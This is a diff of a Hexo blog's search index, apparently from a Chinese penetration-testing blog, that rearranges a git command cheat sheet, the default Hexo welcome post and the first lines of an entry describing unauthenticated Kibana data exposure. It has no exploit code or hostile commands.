-<h2 id="8、合并与衍合"><a href="#8、合并与衍合" class="headerlink" title="8、合并与衍合"></a>8、合并与衍合</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git merge               # 合并指定分支到当前分支</span><br><span class="line"></span><br><span class="line">git merge --abort               # 取消当前合并，重建合并前状态</span><br><span class="line"></span><br><span class="line">git merge dev -Xtheirs          # 以合并dev分支到当前分支，有冲突则以dev分支为准</span><br><span class="line"></span><br><span class="line">git rebase              # 衍合指定分支到当前分支</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="9、远程操作"><a href="#9、远程操作" class="headerlink" title="9、远程操作"></a>9、远程操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote -v                   # 查看远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote show         # 查看指定远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote add    # 添加远程版本库</span><br><span class="line"></span><br><span class="line">git remote remove       # 删除指定的远程版本库</span><br><span class="line"></span><br><span class="line">git fetch               # 从远程库获取代码</span><br><span class="line"></span><br><span class="line">git pull       # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push       # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git push : # 删除远程分支或标签</span><br><span class="line"></span><br><span class="line">git push --tags                 # 上传所有标签</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="10、打包"><a href="#10、打包" class="headerlink" title="10、打包"></a>10、打包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git archive --format=zip --output ../file.zip master    # 将master分支打包成file.zip文件，保存在上一级目录</span><br><span class="line"></span><br><span class="line">git archive --format=zip --output ../v1.2.zip v1.2      # 打包v1.2标签的文件，保存在上一级目录v1.2.zip文件中</span><br><span class="line"></span><br><span class="line">git archive --format=zip v1.2 &gt; ../v1.2.zip             # 作用同上一条命令</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="11、全局和局部配置"><a href="#11、全局和局部配置" class="headerlink" title="11、全局和局部配置"></a>11、全局和局部配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局配置保存在：$Home/.gitconfig</span><br><span class="line">本地仓库配置保存在：.git/config</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="12、远程和本地合并"><a href="#12、远程和本地合并" class="headerlink" title="12、远程和本地合并"></a>12、远程和本地合并</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init                              # 初始化本地代码仓</span><br><span class="line"></span><br><span class="line">git add .                             # 添加本地代码</span><br><span class="line"></span><br><span class="line">git commit -m &quot;add local source&quot;      # 提交本地代码</span><br><span class="line"></span><br><span class="line">git pull origin master                # 下载远程代码</span><br><span class="line"></span><br><span class="line">git merge master                      # 合并master分支</span><br><span class="line"></span><br><span class="line">git push -u origin master             # 上传代码</span><br></pre></td></tr></table></figure>
-
-]]></content>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/2021/09/14/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-      <categories>
-        <category>内网渗透</category>
-      </categories>
-      <tags>
-        <tag>-博客测试</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>kibana未授权访问利用</title>
     <url>/2021/11/25/kibana%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%88%A9%E7%94%A8/</url>
     <content><![CDATA[<h1 id="kibana未授权访问利用"><a href="#kibana未授权访问利用" class="headerlink" title="kibana未授权访问利用"></a>kibana未授权访问利用</h1><h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Kibana如果允许外网访问，没有做安全的登录认证，也会被外部随意访问查看所有的数据，造成少数据泄露。在默认配置下，Kibana就可以访问<a href="https://so.csdn.net/so/search?from=pc_blog_highlight&q=Elasticsearch">Elasticsearch</a>中的所有数据。</p>
@@ -2225,6 +2084,82 @@
       <tags>
         <tag>-web应用漏洞 - Kibana -命令执行</tag>
       </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/2021/09/14/hello-world/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+      <categories>
+        <category>内网渗透</category>
+      </categories>
+      <tags>
+        <tag>-博客测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2022/01/17/git%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
+    <content><![CDATA[<h1 id="git常用命令"><a href="#git常用命令" class="headerlink" title="git常用命令"></a>git常用命令</h1><hr>
+<h2 id="1、常用"><a href="#1、常用" class="headerlink" title="1、常用"></a>1、常用</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote add origin git@github.com:yeszao/dofiler.git     # 配置远程git版本库</span><br><span class="line"></span><br><span class="line">git pull origin master                     # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push origin master                     # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git fetch origin                        # 从远程库获取代码</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git branch                           # 显示所有分支</span><br><span class="line"></span><br><span class="line">git checkout master                       # 切换到master分支</span><br><span class="line"></span><br><span class="line">git checkout -b dev                       # 创建并切换到dev分支</span><br><span class="line"></span><br><span class="line">git commit -m &quot;first version&quot;                  # 提交</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git status                           # 查看状态</span><br><span class="line"></span><br><span class="line">git log                             # 查看提交历史</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git config --global core.editor vim               # 设置默认编辑器为vim（git默认用nano）</span><br><span class="line"></span><br><span class="line">git config core.ignorecase false                # 设置大小写敏感</span><br><span class="line"></span><br><span class="line">git config --global user.name &quot;YOUR NAME&quot;            # 设置用户名</span><br><span class="line"></span><br><span class="line">git config --global user.email &quot;YOUR EMAIL ADDRESS&quot;       # 设置邮箱</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="2、别名alias"><a href="#2、别名alias" class="headerlink" title="2、别名alias"></a>2、别名alias</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git config --global alias.br=&quot;branch&quot;                 # 创建/查看本地分支</span><br><span class="line"></span><br><span class="line">git config --global alias.co=&quot;checkout&quot;               # 切换分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cb=&quot;checkout -b&quot;            # 创建并切换到新分支</span><br><span class="line"></span><br><span class="line">git config --global alias.cm=&quot;commit -m&quot;              # 提交</span><br><span class="line"></span><br><span class="line">git config --global alias.st=&quot;status&quot;                 # 查看状态</span><br><span class="line"></span><br><span class="line">git config --global alias.pullm=&quot;pull origin master&quot;  # 拉取分支</span><br><span class="line"></span><br><span class="line">git config --global alias.pushm=&quot;push origin master&quot;  # 提交分支</span><br><span class="line"></span><br><span class="line">git config --global alias.log=&quot;git log --oneline --graph --decorate --color=always&quot; # 单行、分颜色显示记录</span><br><span class="line"></span><br><span class="line">git config --global alias.logg=&quot;git log --graph --all --format=format:&#x27;%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(bold white)— %an%C(reset)%C(bold yellow)%d%C(reset)&#x27; --abbrev-commit --date=relative&quot; # 复杂显示</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3、创建版本库"><a href="#3、创建版本库" class="headerlink" title="3、创建版本库"></a>3、创建版本库</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone                  # 克隆远程版本库</span><br><span class="line"></span><br><span class="line">git init                        # 初始化本地版本库</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="4、修改和提交"><a href="#4、修改和提交" class="headerlink" title="4、修改和提交"></a>4、修改和提交</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git status                      # 查看状态</span><br><span class="line"></span><br><span class="line">git diff                        # 查看变更内容</span><br><span class="line"></span><br><span class="line">git add .                       # 跟踪所有改动过的文件</span><br><span class="line"></span><br><span class="line">git add                   # 跟踪指定的文件</span><br><span class="line"></span><br><span class="line">git mv               # 文件改名</span><br><span class="line"></span><br><span class="line">git rm                    # 删除文件</span><br><span class="line"></span><br><span class="line">git rm --cached           # 停止跟踪文件但不删除</span><br><span class="line"></span><br><span class="line">git commit -m “commit message”  # 提交所有更新过的文件</span><br><span class="line"></span><br><span class="line">git commit --amend              # 修改最后一次提交</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="5、查看历史"><a href="#5、查看历史" class="headerlink" title="5、查看历史"></a>5、查看历史</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git log                         # 查看提交历史</span><br><span class="line"></span><br><span class="line">git log -p                # 查看指定文件的提交历史</span><br><span class="line"></span><br><span class="line">git blame                 # 以列表方式查看指定文件的提交历史</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="6、撤销"><a href="#6、撤销" class="headerlink" title="6、撤销"></a>6、撤销</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reset --hard HEAD           # 撤消工作目录中所有未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git reset --hard       # 撤销到某个特定版本</span><br><span class="line"></span><br><span class="line">git checkout HEAD         # 撤消指定的未提交文件的修改内容</span><br><span class="line"></span><br><span class="line">git checkout --           # 同上一个命令</span><br><span class="line"></span><br><span class="line">git revert              # 撤消指定的提交分支与标签</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="7、分支与标签"><a href="#7、分支与标签" class="headerlink" title="7、分支与标签"></a>7、分支与标签</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git branch                      # 显示所有本地分支</span><br><span class="line"></span><br><span class="line">git checkout        # 切换到指定分支或标签</span><br><span class="line"></span><br><span class="line">git branch          # 创建新分支</span><br><span class="line"></span><br><span class="line">git branch -d           # 删除本地分支</span><br><span class="line"></span><br><span class="line">git tag                         # 列出所有本地标签</span><br><span class="line"></span><br><span class="line">git tag                # 基于最新提交创建标签</span><br><span class="line"></span><br><span class="line">git tag -a &quot;v1.0&quot; -m &quot;一些说明&quot;  # -a指定标签名称，-m指定标签说明</span><br><span class="line"></span><br><span class="line">git tag -d             # 删除标签</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">git checkout dev                # 合并特定的commit到dev分支上</span><br><span class="line"></span><br><span class="line">git cherry-pick 62ecb3</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="8、合并与衍合"><a href="#8、合并与衍合" class="headerlink" title="8、合并与衍合"></a>8、合并与衍合</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git merge               # 合并指定分支到当前分支</span><br><span class="line"></span><br><span class="line">git merge --abort               # 取消当前合并，重建合并前状态</span><br><span class="line"></span><br><span class="line">git merge dev -Xtheirs          # 以合并dev分支到当前分支，有冲突则以dev分支为准</span><br><span class="line"></span><br><span class="line">git rebase              # 衍合指定分支到当前分支</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="9、远程操作"><a href="#9、远程操作" class="headerlink" title="9、远程操作"></a>9、远程操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git remote -v                   # 查看远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote show         # 查看指定远程版本库信息</span><br><span class="line"></span><br><span class="line">git remote add    # 添加远程版本库</span><br><span class="line"></span><br><span class="line">git remote remove       # 删除指定的远程版本库</span><br><span class="line"></span><br><span class="line">git fetch               # 从远程库获取代码</span><br><span class="line"></span><br><span class="line">git pull       # 下载代码及快速合并</span><br><span class="line"></span><br><span class="line">git push       # 上传代码及快速合并</span><br><span class="line"></span><br><span class="line">git push : # 删除远程分支或标签</span><br><span class="line"></span><br><span class="line">git push --tags                 # 上传所有标签</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="10、打包"><a href="#10、打包" class="headerlink" title="10、打包"></a>10、打包</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git archive --format=zip --output ../file.zip master    # 将master分支打包成file.zip文件，保存在上一级目录</span><br><span class="line"></span><br><span class="line">git archive --format=zip --output ../v1.2.zip v1.2      # 打包v1.2标签的文件，保存在上一级目录v1.2.zip文件中</span><br><span class="line"></span><br><span class="line">git archive --format=zip v1.2 &gt; ../v1.2.zip             # 作用同上一条命令</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="11、全局和局部配置"><a href="#11、全局和局部配置" class="headerlink" title="11、全局和局部配置"></a>11、全局和局部配置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">全局配置保存在：$Home/.gitconfig</span><br><span class="line">本地仓库配置保存在：.git/config</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="12、远程和本地合并"><a href="#12、远程和本地合并" class="headerlink" title="12、远程和本地合并"></a>12、远程和本地合并</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git init                              # 初始化本地代码仓</span><br><span class="line"></span><br><span class="line">git add .                             # 添加本地代码</span><br><span class="line"></span><br><span class="line">git commit -m &quot;add local source&quot;      # 提交本地代码</span><br><span class="line"></span><br><span class="line">git pull origin master                # 下载远程代码</span><br><span class="line"></span><br><span class="line">git merge master                      # 合并master分支</span><br><span class="line"></span><br><span class="line">git push -u origin master             # 上传代码</span><br></pre></td></tr></table></figure>
+
+]]></content>
   </entry>
   <entry>
     <title>Mimikatz使用</title>
